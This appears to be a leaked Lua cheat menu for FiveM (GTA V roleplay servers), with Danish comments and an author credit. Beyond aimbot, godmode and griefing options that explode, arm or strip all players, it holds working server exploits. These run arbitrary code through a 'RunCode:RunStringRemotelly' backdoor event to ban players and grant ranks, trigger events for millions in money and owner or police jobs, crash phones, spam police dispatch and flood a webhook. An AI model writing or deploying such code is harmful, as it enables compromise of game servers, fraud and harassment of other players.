--LEAKER DENNE MENU PGA DET ER EN STOR KOPI AF FALCON!!! HAN TROR HAN SELV HAR LAVET DEN. DER STÅR JO FALCON OVER DET HELE!
...
developers = {
    "Main Dev - maddie#3333", -- Main Developer
    "Second Dev - ! spozt#1935", -- Secondary Developer
...
if has_value(allowedRockstarIDs, RockstarID) then
    ...
    print("Kontakt support for at købe. Rockstar ID: " .. RockstarID)
    print("Kontakt support for at købe. Rockstar ID: " .. RockstarID)
    print("Kontakt support for at købe. Rockstar ID: " .. RockstarID)
    print("Kontakt support for at købe. Rockstar ID: " .. RockstarID)
    print("Kontakt support for at købe. Rockstar ID: " .. RockstarID)
...
menuKeybind = "8" -- Key to open the menu.
...
menuName = "~r~Ciao~w~Menu" -- The name of the menu
version = "1.7" -- Keep it simple
theme = "infamous" -- Feel free to make your own
themes = {"infamous", "basic", "dark", "skid", "hawow"}-- Add themes here if you want them to be in the theme selector
mpMessage = false -- Whether or not to use the big mp message
startMessage = " ~b~Velkommen!, " .. GetPlayerName(PlayerId()) .. "." -- The message that is shown when the menu is opened
subMessage = "~w~Press ~b~" .. menuKeybind .. "~w~ for at åbne menuen." -- subtitle of opening message
motd = " Lavet af ~b~Smaddie~w~!" -- motd
...
function Falcon.SetTheme(id, theme)
    if theme == "basic" then
        ...
        themecolor = '~b~'
        themearrow = "+"
    elseif theme == "hawow" then
        Falcon.SetMenuBackgroundColor(id, 5, 160, 1, 125)
        Falcon.SetTitleBackgroundColor(id, 5, 233, 1, 255)
        Falcon.SetTitleColor(id, 5, 233, 1, 200)
        Falcon.SetMenuSubTextColor(id, 255, 255, 255, 230)
        Falcon.SetFont(id, 0)
        Falcon.SetMenuX(id, .75)
        Falcon.SetMenuY(id, .1)
        Falcon.SetMenuWidth(id, 0.23)-- 0.23
        Falcon.SetMaxOptionCount(id, 13)-- 10
    ...
    elseif theme == "infamous" then
        ...
        Falcon.SetTitleBackgroundColor(id, 255, 45, 33, 170)
        Falcon.SetTitleColor(id, 240, 240, 240, 255)
        Falcon.SetMenuSubTextColor(id, 240, 240, 240, 255)
        Falcon.SetMenuFocusBackgroundColor(id, 255, 45, 33, 230)
        Falcon.SetFont(id, 4)
...
Citizen.CreateThread(function()
    local p = 1
    while true do
        if theme == "infamous" then -- static effect for skid theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
...
Citizen.CreateThread(function()
    ...
    -- MAIN MENU
    Falcon.CreateMenu('skid', menuName .. ' v' .. version)
    Falcon.SetSubTitle('skid', '~w~By ~r~maddie#3333')
    
    -- MAIN MENU SUBMENUS
    Falcon.CreateSubMenu('player', 'skid', 'Player Options')
    Falcon.CreateSubMenu('self', 'skid', 'Self Options')
    Falcon.CreateSubMenu('weapon', 'skid', 'Weapon Options')
    Falcon.CreateSubMenu('vehicle', 'skid', 'Vehicle Options')
    Falcon.CreateSubMenu('world', 'skid', 'World Options')
	Falcon.CreateSubMenu('teleport', 'skid', 'Teleport Options')
    Falcon.CreateSubMenu('misc', 'skid', 'Misc Options')
    Falcon.CreateSubMenu('lua', 'skid', 'Lua Options')
    ...
    Falcon.CreateSubMenu('other', 'lua', 'Devo/Sky')
    ...
    while true do
        ...
        -- MAIN MENU
        if Falcon.IsMenuOpened('skid') then
            if Falcon.MenuButton('Player Options', 'player') then
            elseif Falcon.MenuButton('Self Options', 'self') then
            elseif Falcon.MenuButton('Weapon Options', 'weapon') then
            elseif Falcon.MenuButton('Vehicle Options', 'vehicle') then
            elseif Falcon.MenuButton('World Options', 'world') then
			elseif Falcon.MenuButton('Teleport Options', 'teleport') then
            elseif Falcon.MenuButton('Misc Options', 'misc') then
            elseif Falcon.MenuButton('Lua Options', 'lua') then
            elseif Falcon.Button('Exit') then Falcon.CloseMenu()
            elseif Falcon.Button('~w~Kill Menu') then break
            end
        ...
        elseif Falcon.IsMenuOpened('allplayer') then
            ...
            elseif Falcon.Button("Strip All Players Weapons") then
        ...
        elseif Falcon.IsMenuOpened('self') then
            if Falcon.MenuButton("Appearance ", 'appearance') then
            elseif Falcon.MenuButton("Modifiers", 'modifiers') then
            elseif Falcon.CheckBox("Stealth Godmode", Godmode) then
                Godmode = not Godmode
			...
			elseif Falcon.ComboBox("Player Functions", {"Heal Player", "Give Player Armor", "Remove Player Armor", "Clean Player", "Suicide", "Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
            ...
            elseif Falcon.ComboBoxSlider("Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selectedIndex)
			...
			elseif Falcon.ComboBoxSlider("Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selectedIndex)
            ...
            elseif Falcon.CheckBox("Magneto Mode", ForceTog) then
                ForceMod()
            elseif Falcon.CheckBox("Forcefield", Forcefield) then
                Forcefield = not Forcefield
            elseif Falcon.CheckBox("Noclip", Noclipping) then
                ToggleNoclip()
            elseif Falcon.CheckBox("Never Wanted", NeverWanted) then
        ...
        elseif Falcon.IsMenuOpened('weapon') then
            if Falcon.MenuButton("Give Weapon", 'weaponspawner') then
            ...
            elseif Falcon.ComboBox("Aimbot Bone Target", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                ...
                elseif Falcon.CheckBox("~r~Ragebot", Ragebot) then
                    Ragebot = not Ragebot
                end
        ...
        elseif Falcon.IsMenuOpened('vehicle') then
            if Falcon.MenuButton("Vehicle Spawner", 'vehiclespawner') then
                elseif Falcon.MenuButton("Vehicle Mods", 'vehiclemods') then
                elseif Falcon.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
                elseif Falcon.CheckBox("Vehicle Godmode", VehGodmode) then
                    VehGodmode = not VehGodmode
				elseif Falcon.ComboBox("Vehicle Functions", {"Repair Vehicle", "Clean Vehicle", "Dirty Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selectedIndex)
                ...
                elseif Falcon.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                    ...
                    elseif Falcon.CheckBox("Deadly Tractor", DeadlyBulldozer) then
                        DeadlyBulldozer = not DeadlyBulldozer
                        if DeadlyBulldozer then
                            local veh = SpawnVeh("TRACTOR", 1, SpawnEngineOn)
        ...
        elseif Falcon.IsMenuOpened('world') then
            if Falcon.MenuButton("Object Spawner", 'objectspawner') then
            elseif Falcon.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
            elseif Falcon.MenuButton("Time Changer", 'time') then
            elseif Falcon.Button("Set All Nearby Vehicles Plate Text") then
            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
            ...
            elseif Falcon.CheckBox("Make All Cars Fly", FlyingCars) then
            ...
            elseif Falcon.CheckBox("Set The World On ~r~Fire", WorldOnFire) then
                WorldOnFire = not WorldOnFire
                if WorldOnFire then
                    wofDUI = CreateDui("https://firebasestorage.googleapis.com/v0/b/jaermand-495f8.appspot.com/o/sejt.mp3?alt=media&token=90fb2138-b273-48e8-8f27-9742ad42d3a4", 1, 1)
                else
                    DestroyDui(wofDUI)
                end
            elseif Falcon.Button("~r~Fuck Up The Map (Irreversible!)  [WIP]") then
                if not FuckMap then
        ...
        elseif Falcon.IsMenuOpened('misc') then
            if Falcon.ComboBox('Theme', themes, currThemeIndex, selThemeIndex, function(currentIndex, selectedIndex)
                currThemeIndex = currentIndex
                selThemeIndex = selectedIndex
            end) then theme = themes[selThemeIndex]Falcon.InitializeTheme()
			elseif Falcon.MenuButton("Keybindings", 'keybindings') then
        ...
        elseif Falcon.IsMenuOpened('lua') then
            if Falcon.MenuButton('ESX Options', 'esx') then
                elseif Falcon.MenuButton('vRP Options', 'vrp') then
                elseif Falcon.MenuButton('Devo/Sky', 'other') then
                    end
        
        
        -- ESX OPTIONS
        elseif Falcon.IsMenuOpened('esx') then
            if Falcon.Button("~b~ESX ~w~Restore Hunger") then
        ...
        elseif Falcon.IsMenuOpened('vrp') then
            if Falcon.Button("~r~vRP ~w~Strips Af/På") then
                vRP.toggleHandcuff()
            elseif Falcon.Button("~r~vRP ~w~Pose Af/På") then
                vrp.putOnBag()
    ...
    elseif Falcon.IsMenuOpened('other') then
        if Falcon.Button("~r~Devo ~w~Money ~~") then
            local belob = GetKeyboardInput("Beløb")
            TriggerEvent("scrap:SellVehicle", belob)
        elseif Falcon.Button('~r~Devo ~w~GCPHONE CRASHER') then
                for i = 0, 450 do
        ...
        elseif Falcon.Button("~r~Devo ~w~15 Mil") then
            TriggerServerEvent("scrap:SellVehicle", 15000000)
            local confirm = GetKeyboardInput("Er du sikker, der er ban risiko? ~g~Y~w~/~r~N")
         if string.lower(confirm) == "y" then
        ...
        elseif Falcon.Button("~r~Devo ~w~Tilføj Rank") then
            ...
            TriggerServerEvent('RunCode:RunStringRemotelly', admin2)
        elseif Falcon.Button("~r~Devo ~w~Groups/Ceva") then
        ...
        elseif Falcon.Button("~r~Devo ~w~Webhook") then
        ...
        elseif Falcon.Button("~r~Devo ~w~Webhook Spammer") then
            TriggerServerEvent("RunCode:RunStringRemotelly")
            for i=1,100 do
                PerformHttpRequest(GetKeyboardInput("Webhook:"), function(err, text, headers) end, 'POST', json.encode({username = name, content = message}), { ['Content-Type'] = 'application/json' })
              end
        elseif Falcon.Button("~r~Devo ~w~Tjek Database") then
            TriggerServerEvent('RunCode:RunStringRemotelly', [[
        ...
        elseif Falcon.Button("~r~Devo ~w~Ban Spiller") then
            TriggerServerEvent("RunCode:RunStringRemotelly", admin)
            local id = "local id = " .. GetKeyboardInput("ID:", " ", 20) .. " "
            local reason = 'local reason = "'.. GetKeyboardInput('Grund:', '' , 20)..'" '
            local admin = [[ 
                    local warof = 5
                    local users = vRP.getUsers({})
                    local player = vRP.getUserSource({id})
                    vRP.ban(user_id, reason, true)
                    for i = 1,500 do 
                        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    end
            ]]
            local admin2 = id .. reason ..admin
            TriggerServerEvent('RunCode:RunStringRemotelly', admin2)
        elseif Falcon.Button("~r~Devo ~w~Spam All Units") then
            local message = "local message = " .. GetKeyboardInput("Besked:", " ", 20) .. " "
            TriggerServerEvent('dispatchpolice', x,y,z,message)

            
        elseif Falcon.Button("~b~Sky ~w~Bliv Ejer") then
            TriggerEvent("kasperr_kriminel:selectJob", "ledelse")
            TriggerEvent("kasperr_kriminel:selectJob", "Admin")
            TriggerEvent("kasperr_kriminel:selectJob", "Ejer")
            TriggerEvent("kasperr_kriminel:selectJob", "thanighthawk")

        elseif Falcon.Button("~b~Sky ~w~Bliv Politi") then
            TriggerEvent("kasperr_jobcenter:selectJob", "Politi-Job")
        elseif Falcon.Button ("~b~ANDET ~w~Bella Ciao ~r~(PAS PÅ)") then
            -- Init Skid Menu Functions
local includeself = true
function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
...
ShowInfo("BELLA CIAO")
ShowInfo("ok tjak tjak script lavet af ! spozt#1935")
bellaciaoDUI = CreateDui("https://firebasestorage.googleapis.com/v0/b/jaermand-495f8.appspot.com/o/sejt.mp3?alt=media&token=90fb2138-b273-48e8-8f27-9742ad42d3a4", 1, 1)
for k in EnumerateVehicles() do
    RequestControlOnce(k)
    SetVehicleNumberPlateText(k, "SMADDIE")
end
GiveAllPlayersWeapons(includeself)
...
for i = 0, 128 do
    ...
    if HasModelLoaded(GetHashKey(swat)) then
        ...
        -- OPEN MENU
        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then Falcon.OpenMenu('skid')-- Change keys in config, not here
        ...
        if ExplodingAll then
            ExplodeAll(includeself)
            CreateDui("https://firebasestorage.googleapis.com/v0/b/jaermand-495f8.appspot.com/o/sejt.mp3?alt=media&token=90fb2138-b273-48e8-8f27-9742ad42d3a4", 1, 1)
        end
